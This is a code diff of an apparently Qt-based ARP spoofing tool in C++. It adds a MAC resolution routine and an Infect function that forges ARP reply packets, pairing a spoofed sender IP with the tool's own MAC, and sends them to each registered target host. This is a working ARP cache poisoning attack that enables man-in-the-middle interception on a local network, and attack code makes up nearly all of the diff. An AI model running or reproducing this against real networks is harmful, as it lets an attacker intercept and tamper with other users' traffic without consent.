@@ -19,8 +19,7 @@ void ArpSpoofing::RecvPacketThreadFunc() {
             }
             case STATUS_PLAY: {
                 unique_lock<mutex> t(this->mtx_);
-                if(this->ReadPacket(this->GetCurrentInterface())) {
-
+                if(this->ReadPacket()) {
                 }
                 t.unlock();
                 break;
@@ -37,7 +36,106 @@ END:
     return;
 }
 
+Mac ArpSpoofing::ResolveMac(const string targetIP) {
+    Mac ret{};
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
 
+    try {
+        if(sock < 0)
+            throw runtime_error("Failed to create socket");
+
+        arpreq req{};
+
+        //memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.c_str(), sizeof(req.arp_dev));
+        memcpy(req.arp_dev, cInterfaceInfo_.interfaceName_.data(), sizeof(req.arp_dev));
+
+        req.arp_pa.sa_family = AF_INET;
+        //inet_pton(AF_INET, targetIP.c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);
+        inet_pton(AF_INET, targetIP.data(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);
+
+        if(ioctl(sock, SIOCGARP, &req) == -1)
+            throw runtime_error("Failed to set ioctl");
+
+        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);
+
+    }catch(const exception& e) {
+        cerr<<"GetMacAddress : "<<e.what()<<endl;
+        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
+    }
+
+    close(sock);
+
+    return ret;
+}
+
+bool ArpSpoofing::Infect() {
+    try {
+        //if(cInterfaceInfo_ == NULL) throw runtime_error("interface is not setup.");
+        for(Flow& flow : flowList_) {
+            Mac targetMac = ResolveMac(string(flow.tip_));
+            if(targetMac.isNull()) throw runtime_error("target mac is null");
+
+            EthArpPacket packet{};
+
+            packet.eth_.dmac_ = targetMac;
+            packet.arp_.tmac_ = targetMac;
+
+            packet.eth_.smac_ = cInterfaceInfo_.mac_;
+            packet.arp_.smac_ = cInterfaceInfo_.mac_;
+
+
+            packet.eth_.type_ = htons(EthHdr::Arp);
+            packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
+            packet.arp_.protocolType_ = htons(EthHdr::Ip4);
+            packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
+            packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
+            packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);
+
+            //inet_pton(AF_INET, flow.sip_.toStdString().c_str(), &packet.arp_.sip_);
+            //inet_pton(AF_INET, flow.tip_.toStdString().c_str(), &packet.arp_.tip_);
+
+            packet.arp_.sip_ = htonl(flow.sip_);
+            packet.arp_.tip_ = htonl(flow.tip_);
+
+            SendPacket(reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));
+        }
+
+    }catch(const std::exception& e) {
+        cerr<<"Failed to infect : "<<e.what()<<endl;
+        return false;
+    }
+    return true;
+}
+
+//public
 ArpSpoofing::ArpSpoofing() {
 
+}
+
+
+
+void ArpSpoofing::Register(const QString senderIP, const QString targetIP) {
+    unique_lock<mutex> t(mtx_);
+    flowList_.push_back(Flow(senderIP, targetIP));
+}
+
+void ArpSpoofing::Register(const Flow flow) {
+    unique_lock<mutex> t(mtx_);
+    flowList_.push_back(flow);
+}
+
+void ArpSpoofing::Register(const std::vector<Flow> flow) {
+    unique_lock<mutex> t(mtx_);
+    for(const Flow& f : flow) {
+        flowList_.push_back(f);
+    }
+}
+
+list<Flow> ArpSpoofing::GetFlows() {
+    unique_lock<mutex> t(mtx_);
+    return flowList_;
+}
+
+void ArpSpoofing::Run() {
+    Infect();
 }
